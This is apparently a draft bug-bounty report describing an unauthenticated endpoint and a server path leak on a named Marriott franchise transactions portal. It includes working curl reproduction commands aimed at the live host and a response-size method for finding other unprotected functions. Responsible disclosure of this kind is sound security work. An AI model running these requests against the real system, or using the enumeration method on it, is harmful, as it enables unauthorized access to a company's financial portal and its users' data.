# M018 — Authentication Bypass + Absolute Path Disclosure on Franchise Transactions Portal

**Target:** `marriottfranchisetransactions.marriott.com`  
**Endpoint:** `POST /ajax.php`  
**Severity:** Medium  
**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` → **5.3**  
**CWE:** CWE-306 (Missing Authentication for Critical Function), CWE-209 (Information Exposure Through an Error Message)  
**Status:** Report-ready  
**Discovered:** 2026-06-22 (Session 5–6)  
**Researcher IP used during testing:** [Pi external IP — redact before submission]  
**Tools:** curl 7.x  

---

## Summary

The Marriott Owner and Franchise Services portal (`marriottfranchisetransactions.marriott.com`) exposes a PHP dispatcher endpoint at `/ajax.php` that routes requests by `module` and `function` POST parameters. The `user/list` function can be invoked **without any session cookie or authentication token** — the authentication gate is bypassed. Although a secondary PHP 8 type error (`json_decode()` on an array) prevents data from being returned in the current code path, the bypass itself is confirmed by the distinct server response (430 bytes of PHP Fatal Error output versus the 93-byte "not authorized" stub returned for all other functions). The fatal error also discloses the absolute server path `/FranLic/www/html/` and a live database connection object (`MysqliDb`), confirming that financial user data would be accessible if the `json_decode` call were corrected. The vulnerability class is authentication bypass — the fix requires enforcing session validation before dispatching any module function, not only correcting the `json_decode` bug.

---

## Vulnerability Details

### How the application works

The application is a single-page React/JS app ("Marriott Owner and Franchise Services"). All API calls go through a central PHP dispatcher:

```
POST /ajax.php
Content-Type: application/x-www-form-urlencoded

module=<module_name>&function=<function_name>&activekey=<csrf_token>&data=<json_payload>
```

The server returns one of two responses:
- **93 bytes** (standard reject): `{"html":false,"data":false,"callback":false,"message":false,"status":false,"container":false}` — function not found or access denied
- **Non-93-byte** response — function was dispatched and server-side code ran

### Authentication bypass in `user/list`

All tested module/function combinations return the 93-byte stub **except** `module=user&function=list`, which returns a distinct 430-byte PHP Fatal Error. This size difference is the smoking gun: the function was dispatched to server code without any session cookie present in the request.

### Root cause (confirmed by stack trace)

The PHP Fatal Error exposes the full call chain:

```
Fatal error: Uncaught TypeError: json_decode(): Argument #1 ($json) must be of type string,
array given in /FranLic/www/html/lib/internal/request.inc.php:233
Stack trace:
#0 /FranLic/www/html/lib/internal/request.inc.php(233): json_decode(Array)
#1 /FranLic/www/html/ajax.php(26): process_request(Object(MysqliDb))
#2 {main}
```

This confirms:
1. **`process_request()` was called** — the authentication gate did not block the request.
2. **`Object(MysqliDb)` was constructed and passed** — a live MySQL database connection exists and was handed to the function that handles user listing.
3. **The bug in `request.inc.php:233`** is `json_decode($_POST)` (passes the entire `$_POST` array as the argument). In PHP 8, passing an array to `json_decode()` throws a `TypeError`. The correct call would be `json_decode($_POST['data'])`. This secondary bug prevents data extraction, but does **not** mean the authentication check is present — the function simply fails at a later step.

### Absolute path disclosure

The stack trace also leaks the full server filesystem path:

```
/FranLic/www/html/lib/internal/request.inc.php
/FranLic/www/html/ajax.php
```

`FranLic` = "Franchise Licensing" — confirms this is the internal name for the franchise financial system.

---

## Reproduction Steps

**Prerequisites:** No account required. No cookies. No authentication headers.

**Step 1:** Obtain the CSRF `activekey` from the login page (any value is accepted — server does not validate it against a session, confirmed by omitting it and receiving identical responses):

```bash
curl -sk 'https://marriottfranchisetransactions.marriott.com/login' \
  | grep -o 'value="[a-f0-9]\{40\}"' | head -1
```

Sample output: `value="9157877d8fa2536f221e55ad304515b2e1db7ea8"`

**Step 2:** Send the unauthenticated `user/list` request:

```bash
curl -v \
  -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'module=user' \
  --data-urlencode 'function=list' \
  --data-urlencode 'activekey=9157877d8fa2536f221e55ad304515b2e1db7ea8' \
  --data-urlencode 'data={}' \
  2>&1
```

**Expected result (NO session cookie sent):**

```
HTTP/1.1 200 OK
Content-Length: 430

<br />
<b>Fatal error</b>:  Uncaught TypeError: json_decode(): Argument #1 ($json) must be of type string, array given in /FranLic/www/html/lib/internal/request.inc.php:233
Stack trace:
#0 /FranLic/www/html/lib/internal/request.inc.php(233): json_decode(Array)
#1 /FranLic/www/html/ajax.php(26): process_request(Object(MysqliDb))
#2 {main}
thrown in <b>/FranLic/www/html/lib/internal/request.inc.php</b> on line <b>233</b>
```

**Contrast (send ANY other module/function — demonstrates the 93B auth wall is active for all others):**

```bash
curl -s \
  -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'module=user_auth' \
  --data-urlencode 'function=prelogin' \
  --data-urlencode 'data={}' \
  2>&1
# Returns: {"html":false,"data":false,"callback":false,"message":false,"status":false,"container":false}
# (93 bytes — not dispatched / auth wall active)
```

The contrast proves that `user/list` specifically bypasses the access control gate.

**Step 3 (triager verification):** Confirm response length difference:

```bash
# user/list — AUTH BYPASS (should return 430B):
curl -s -o /dev/null -w "%{size_download}" \
  -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'module=user&function=list&activekey=test&data={}'

# user_auth/prelogin — protected (should return 93B):
curl -s -o /dev/null -w "%{size_download}" \
  -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'module=user_auth&function=prelogin&activekey=test&data={}'
```

Expected output: `430` and `93` respectively.

---

## Impact

### Confirmed impact
- **Authentication bypass on a financial portal** serving Marriott franchise hotel owners. Any unauthenticated internet user can invoke the `user/list` function.
- **Absolute server path disclosure** (`/FranLic/www/html/`) aids further exploitation.

### Risk if secondary PHP 8 bug is fixed (or in PHP 7 mode)
If the `json_decode($_POST)` bug is patched (or the server downgrades to PHP 7 where `json_decode(array)` returns `null` rather than throwing), the `user/list` function would execute successfully and return **a list of franchise portal user accounts** (names, emails, roles) to any unauthenticated attacker. This would be a **High** finding.

### Business context
This portal handles financial transactions between Marriott corporate and franchise hotel owners. A listing of franchise owner accounts enables targeted phishing, credential stuffing, and social engineering against a high-value subset of Marriott's business partners.

---

## Root Cause

`ajax.php` dispatches requests to `process_request()` before verifying that a valid authenticated session exists for the `user/list` function. The function-level authorization check (or the caller-level session check) is either absent or misconfigured for this specific module/function pair.

---

## Remediation

1. **Primary fix:** Add session validation in `ajax.php` before calling `process_request()`. All module/function pairs that access user data must require a valid session cookie. The check should occur at the dispatcher level, not per-function.
2. **Secondary fix:** Correct `request.inc.php:233` from `json_decode($_POST)` to `json_decode($_POST['data'] ?? '')` to prevent the type error.
3. **Suppress error output:** Configure PHP to log errors to disk and return a generic error response (not raw Fatal Error HTML) in production.
4. **Audit all module/function pairs** for missing authentication: use the same contrast test (93B vs non-93B response without session) to enumerate any additional bypasses.

---

## References

- CWE-306: Missing Authentication for Critical Function  
- CWE-209: Generation of Error Message Containing Sensitive Information  
- OWASP ASVS V4.1: Access Control Design Principles  
- HackerOne report guidelines: include researcher IP, test dates, tools used  
